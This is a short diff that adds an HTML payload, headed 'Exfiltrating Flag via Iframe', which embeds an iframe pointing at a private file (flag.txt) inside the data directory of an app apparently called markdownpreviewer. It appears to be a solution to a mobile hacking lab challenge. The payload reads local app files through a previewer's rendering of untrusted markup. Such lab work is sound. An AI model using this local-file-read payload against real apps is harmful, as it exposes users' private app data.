@@ -1,0 +1,2 @@
+<h3>Exfiltrating Flag via Iframe:</h3>
+<iframe src="file:///data/data/com.mobilehackinglab.markdownpreviewer/files/flag.txt" style="width:100%; height:300px; border:2px solid red; background:white;"></iframe>
